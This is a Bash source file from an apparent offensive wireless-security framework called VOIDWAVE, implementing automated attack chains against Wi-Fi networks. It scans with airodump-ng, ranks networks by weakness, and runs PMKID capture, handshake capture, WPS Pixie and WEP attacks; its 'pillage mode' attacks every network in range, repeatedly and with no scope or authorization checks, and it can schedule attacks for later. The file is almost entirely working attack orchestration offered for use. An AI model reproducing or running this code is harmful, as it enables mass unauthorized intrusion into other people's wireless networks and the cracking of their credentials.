#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Automation Engine: Attack chains, target filtering, pillage mode
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_AUTOMATION_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_AUTOMATION_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

# Source attack modules
for module in wps handshake pmkid dos eviltwin wep enterprise advanced; do
    [[ -f "${BASH_SOURCE%/*}/../attacks/${module}.sh" ]] && source "${BASH_SOURCE%/*}/../attacks/${module}.sh"
done

[[ -f "${BASH_SOURCE%/*}/../wireless/loot.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/loot.sh"
[[ -f "${BASH_SOURCE%/*}/../wireless/session.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/session.sh"

#═══════════════════════════════════════════════════════════════════════════════
# AUTOMATION CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Attack chain settings
declare -g AUTO_SCAN_TIME="${AUTO_SCAN_TIME:-60}"
declare -g AUTO_ATTACK_TIMEOUT="${AUTO_ATTACK_TIMEOUT:-300}"
declare -g AUTO_SKIP_CRACKED="${AUTO_SKIP_CRACKED:-true}"
declare -g AUTO_PARALLEL_ATTACKS="${AUTO_PARALLEL_ATTACKS:-false}"

# Target filtering
declare -ga AUTO_TARGET_BSSIDS=()
declare -ga AUTO_TARGET_ESSIDS=()
declare -ga AUTO_EXCLUDE_BSSIDS=()
declare -ga AUTO_EXCLUDE_ESSIDS=()
declare -g AUTO_MIN_POWER="${AUTO_MIN_POWER:--70}"
declare -g AUTO_ENCRYPTION_FILTER="${AUTO_ENCRYPTION_FILTER:-all}"  # all, wep, wpa, wpa2, wpa3, open

# Attack priorities
declare -ga AUTO_ATTACK_CHAIN=("pmkid" "handshake" "wps" "wep")

# State
declare -ga _AUTO_TARGETS=()
declare -gA _AUTO_RESULTS=()
declare -g _AUTO_RUNNING="false"

#═══════════════════════════════════════════════════════════════════════════════
# TARGET SCANNING
#═══════════════════════════════════════════════════════════════════════════════

# Scan for targets
# Args: $1 = interface, $2 = scan time (optional)
auto_scan() {
    local iface="$1"
    local scan_time="${2:-$AUTO_SCAN_TIME}"

    log_info "Scanning for targets (${scan_time}s)..."

    local scan_file
    scan_file=$(mktemp)

    timeout "$scan_time" airodump-ng -w "$scan_file" --output-format csv "$iface" &>/dev/null

    _AUTO_TARGETS=()

    if [[ -f "${scan_file}-01.csv" ]]; then
        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons ivs lan_ip id_len essid key; do
            bssid=$(echo "$bssid" | tr -d ' ')
            channel=$(echo "$channel" | tr -d ' ')
            power=$(echo "$power" | tr -d ' ')
            privacy=$(echo "$privacy" | tr -d ' ')
            essid=$(echo "$essid" | xargs)

            # Skip invalid entries
            [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
            [[ -z "$channel" || "$channel" == "-1" ]] && continue

            # Apply filters
            if ! auto_filter_target "$bssid" "$essid" "$power" "$privacy"; then
                continue
            fi

            # Add to targets
            _AUTO_TARGETS+=("$bssid|$channel|$essid|$power|$privacy")

        done < <(tail -n +3 "${scan_file}-01.csv" 2>/dev/null | head -100)

        rm -f "${scan_file}"* 2>/dev/null
    fi

    log_success "Found ${#_AUTO_TARGETS[@]} target(s)"

    # Sort by signal strength
    IFS=$'\n' _AUTO_TARGETS=($(sort -t'|' -k4 -rn <<< "${_AUTO_TARGETS[*]}")); unset IFS

    return 0
}

# Filter target based on criteria
# Args: $1 = BSSID, $2 = ESSID, $3 = power, $4 = encryption
auto_filter_target() {
    local bssid="$1"
    local essid="$2"
    local power="$3"
    local encryption="$4"

    # Check exclusions first
    for excluded in "${AUTO_EXCLUDE_BSSIDS[@]}"; do
        [[ "$bssid" == "$excluded" ]] && return 1
    done

    for excluded in "${AUTO_EXCLUDE_ESSIDS[@]}"; do
        [[ "$essid" == "$excluded" ]] && return 1
    done

    # Check inclusions (if specified)
    if [[ ${#AUTO_TARGET_BSSIDS[@]} -gt 0 ]]; then
        local found=false
        for target in "${AUTO_TARGET_BSSIDS[@]}"; do
            [[ "$bssid" == "$target" ]] && found=true && break
        done
        [[ "$found" == "false" ]] && return 1
    fi

    if [[ ${#AUTO_TARGET_ESSIDS[@]} -gt 0 ]]; then
        local found=false
        for target in "${AUTO_TARGET_ESSIDS[@]}"; do
            [[ "$essid" == *"$target"* ]] && found=true && break
        done
        [[ "$found" == "false" ]] && return 1
    fi

    # Check signal strength
    if [[ "$power" =~ ^-?[0-9]+$ ]]; then
        [[ "$power" -lt "$AUTO_MIN_POWER" ]] && return 1
    fi

    # Check encryption filter
    case "$AUTO_ENCRYPTION_FILTER" in
        wep)  [[ ! "$encryption" =~ WEP ]] && return 1 ;;
        wpa)  [[ ! "$encryption" =~ WPA ]] && return 1 ;;
        wpa2) [[ ! "$encryption" =~ WPA2 ]] && return 1 ;;
        wpa3) [[ ! "$encryption" =~ WPA3|SAE ]] && return 1 ;;
        open) [[ ! "$encryption" =~ OPN|Open ]] && return 1 ;;
    esac

    # Skip already cracked
    if [[ "$AUTO_SKIP_CRACKED" == "true" ]]; then
        if declare -F wireless_loot_is_cracked &>/dev/null; then
            wireless_loot_is_cracked "$bssid" && return 1
        fi
    fi

    return 0
}

# List current targets
auto_list_targets() {
    echo ""
    echo -e "    ${C_CYAN}Automation Targets${C_RESET}"
    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..60})${C_RESET}"

    local idx=0
    for target in "${_AUTO_TARGETS[@]}"; do
        ((idx++)) || true
        IFS='|' read -r bssid channel essid power encryption <<< "$target"

        local status="${_AUTO_RESULTS[$bssid]:-pending}"
        local status_color="$C_GHOST"
        case "$status" in
            success) status_color="$C_GREEN" ;;
            failed)  status_color="$C_RED" ;;
            running) status_color="$C_YELLOW" ;;
        esac

        printf "    ${C_WHITE}[%2d]${C_RESET} %-20s %s Ch:%-2s Pwr:%-3s ${status_color}%s${C_RESET}\n" \
            "$idx" "${essid:0:20}" "$bssid" "$channel" "$power" "$status"
    done

    echo ""
}

#═══════════════════════════════════════════════════════════════════════════════
# ATTACK CHAINS
#═══════════════════════════════════════════════════════════════════════════════

# Determine best attack for target
# Args: $1 = BSSID, $2 = encryption
auto_select_attack() {
    local bssid="$1"
    local encryption="$2"

    case "$encryption" in
        *WEP*)
            echo "wep"
            ;;
        *WPA3*|*SAE*)
            echo "pmkid"  # PMKID still works on some WPA3
            ;;
        *WPA*|*WPA2*)
            # Check for WPS first
            if auto_check_wps "$bssid"; then
                echo "wps"
            else
                echo "pmkid"  # Try PMKID first, fall back to handshake
            fi
            ;;
        *OPN*|*Open*)
            echo "none"  # Open network, no attack needed
            ;;
        *)
            echo "handshake"  # Default to handshake capture
            ;;
    esac
}

# Quick WPS check
# Args: $1 = BSSID
auto_check_wps() {
    local bssid="$1"

    # Quick wash scan
    local result
    result=$(timeout 5 wash -i "$iface" 2>/dev/null | grep -i "$bssid")

    [[ -n "$result" && ! "$result" =~ "Lck" ]]
}

# Execute attack chain on single target
# Args: $1 = interface, $2 = target string (BSSID|channel|ESSID|power|encryption)
auto_attack_target() {
    local iface="$1"
    local target="$2"

    IFS='|' read -r bssid channel essid power encryption <<< "$target"

    log_info "Attacking: ${C_WHITE}$essid${C_RESET} ($bssid)"
    _AUTO_RESULTS["$bssid"]="running"

    local success=false

    for attack in "${AUTO_ATTACK_CHAIN[@]}"; do
        # Skip irrelevant attacks
        case "$attack" in
            wep) [[ ! "$encryption" =~ WEP ]] && continue ;;
            wps) ! auto_check_wps "$bssid" && continue ;;
        esac

        log_info "Trying: $attack"

        case "$attack" in
            pmkid)
                if declare -F pmkid_capture_target &>/dev/null; then
                    if pmkid_capture_target "$iface" "$bssid" "$essid"; then
                        success=true
                        break
                    fi
                fi
                ;;

            handshake)
                if declare -F handshake_capture_full &>/dev/null; then
                    if handshake_capture_full "$iface" "$bssid" "$channel" "$essid"; then
                        success=true
                        break
                    fi
                fi
                ;;

            wps)
                if declare -F wps_pixie_auto &>/dev/null; then
                    if wps_pixie_auto "$iface" "$bssid" "$channel"; then
                        success=true
                        break
                    fi
                fi
                ;;

            wep)
                if declare -F wep_attack_quick &>/dev/null; then
                    if wep_attack_quick "$iface" "$bssid" "$channel"; then
                        success=true
                        break
                    fi
                fi
                ;;
        esac

        # Check timeout
        # (timeout logic would go here)
    done

    if [[ "$success" == "true" ]]; then
        _AUTO_RESULTS["$bssid"]="success"
        log_success "Attack successful: $essid"
        return 0
    else
        _AUTO_RESULTS["$bssid"]="failed"
        log_warning "Attack failed: $essid"
        return 1
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# PILLAGE MODE
#═══════════════════════════════════════════════════════════════════════════════

# Pillage mode - attack everything automatically
# Args: $1 = interface, $2 = scan time (optional)
auto_pillage() {
    local iface="$1"
    local scan_time="${2:-$AUTO_SCAN_TIME}"

    log_warning "Starting PILLAGE MODE - attacking all discovered targets"
    _AUTO_RUNNING="true"

    # Initial scan
    auto_scan "$iface" "$scan_time"

    if [[ ${#_AUTO_TARGETS[@]} -eq 0 ]]; then
        log_warning "No targets found"
        return 1
    fi

    auto_list_targets

    local success_count=0
    local total_count=${#_AUTO_TARGETS[@]}

    for target in "${_AUTO_TARGETS[@]}"; do
        [[ "$_AUTO_RUNNING" != "true" ]] && break

        if auto_attack_target "$iface" "$target"; then
            ((success_count++)) || true
        fi

        # Brief pause between targets
        sleep 5
    done

    _AUTO_RUNNING="false"

    log_info "Pillage complete: $success_count/$total_count successful"
    auto_list_targets

    return 0
}

# Continuous pillage (rescan and attack new targets)
# Args: $1 = interface
auto_pillage_continuous() {
    local iface="$1"

    log_warning "Starting CONTINUOUS PILLAGE MODE"
    log_info "Press Ctrl+C to stop"

    _AUTO_RUNNING="true"

    while [[ "$_AUTO_RUNNING" == "true" ]]; do
        auto_scan "$iface" 30

        for target in "${_AUTO_TARGETS[@]}"; do
            [[ "$_AUTO_RUNNING" != "true" ]] && break

            IFS='|' read -r bssid _ _ _ _ <<< "$target"

            # Skip already attacked
            [[ -n "${_AUTO_RESULTS[$bssid]}" ]] && continue

            auto_attack_target "$iface" "$target"
        done

        log_info "Rescanning for new targets..."
        sleep 10
    done

    log_info "Continuous pillage stopped"
}

# Stop pillage mode
auto_stop() {
    _AUTO_RUNNING="false"
    log_info "Stopping automation..."
}

#═══════════════════════════════════════════════════════════════════════════════
# SMART ATTACK MODE
#═══════════════════════════════════════════════════════════════════════════════

# Smart mode - prioritizes weak targets
# Args: $1 = interface
auto_smart() {
    local iface="$1"

    log_info "Starting SMART mode - prioritizing weak targets"

    auto_scan "$iface"

    # Sort targets by vulnerability
    # Priority: WEP > WPS unlocked > weak signal WPA2 > WPA3

    local wep_targets=()
    local wps_targets=()
    local wpa_targets=()

    for target in "${_AUTO_TARGETS[@]}"; do
        IFS='|' read -r bssid channel essid power encryption <<< "$target"

        if [[ "$encryption" =~ WEP ]]; then
            wep_targets+=("$target")
        elif auto_check_wps "$bssid"; then
            wps_targets+=("$target")
        else
            wpa_targets+=("$target")
        fi
    done

    log_info "Target breakdown: ${#wep_targets[@]} WEP, ${#wps_targets[@]} WPS, ${#wpa_targets[@]} WPA"

    # Attack in priority order
    for target in "${wep_targets[@]}" "${wps_targets[@]}" "${wpa_targets[@]}"; do
        auto_attack_target "$iface" "$target"
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# SCHEDULED ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Schedule attack for specific time
# Args: $1 = interface, $2 = time (HH:MM), $3 = target BSSID
auto_schedule() {
    local iface="$1"
    local time="$2"
    local target_bssid="$3"

    log_info "Scheduling attack on $target_bssid at $time"

    # Calculate delay
    local now
    now=$(date +%s)
    local target_time
    target_time=$(date -d "$time" +%s 2>/dev/null)

    if [[ -z "$target_time" || "$target_time" -le "$now" ]]; then
        # Assume tomorrow if time has passed
        target_time=$(date -d "tomorrow $time" +%s)
    fi

    local delay=$((target_time - now))

    log_info "Attack will start in $((delay / 60)) minutes"

    (
        sleep "$delay"
        log_info "Scheduled attack starting..."

        # Scan for target
        auto_scan "$iface" 30

        for target in "${_AUTO_TARGETS[@]}"; do
            if [[ "$target" == *"$target_bssid"* ]]; then
                auto_attack_target "$iface" "$target"
                break
            fi
        done
    ) &

    echo $!
}

#═══════════════════════════════════════════════════════════════════════════════
# STATUS AND RESULTS
#═══════════════════════════════════════════════════════════════════════════════

# Show automation status
auto_status() {
    echo ""
    echo -e "    ${C_CYAN}Automation Status${C_RESET}"
    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..40})${C_RESET}"

    echo -e "    Running:    ${_AUTO_RUNNING}"
    echo -e "    Targets:    ${#_AUTO_TARGETS[@]}"

    local success=0 failed=0 pending=0
    for bssid in "${!_AUTO_RESULTS[@]}"; do
        case "${_AUTO_RESULTS[$bssid]}" in
            success) ((success++)) ;;
            failed)  ((failed++)) ;;
            *)       ((pending++)) ;;
        esac
    done

    echo -e "    Success:    ${C_GREEN}$success${C_RESET}"
    echo -e "    Failed:     ${C_RED}$failed${C_RESET}"
    echo -e "    Pending:    ${C_GHOST}$pending${C_RESET}"
    echo ""
}

# Export results to file
# Args: $1 = output file
auto_export_results() {
    local output_file="${1:-/tmp/automation_results.txt}"

    {
        echo "VOIDWAVE Automation Results"
        echo "Generated: $(date)"
        echo "================================"
        echo ""

        for target in "${_AUTO_TARGETS[@]}"; do
            IFS='|' read -r bssid channel essid power encryption <<< "$target"
            local status="${_AUTO_RESULTS[$bssid]:-pending}"
            echo "[$status] $essid ($bssid) - Ch:$channel $encryption"
        done
    } > "$output_file"

    log_success "Results exported to: $output_file"
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

auto_cleanup() {
    _AUTO_RUNNING="false"
    _AUTO_TARGETS=()
    _AUTO_RESULTS=()
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup auto_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f auto_scan auto_filter_target auto_list_targets
export -f auto_select_attack auto_attack_target
export -f auto_pillage auto_pillage_continuous auto_stop
export -f auto_smart auto_schedule
export -f auto_status auto_export_results auto_cleanup
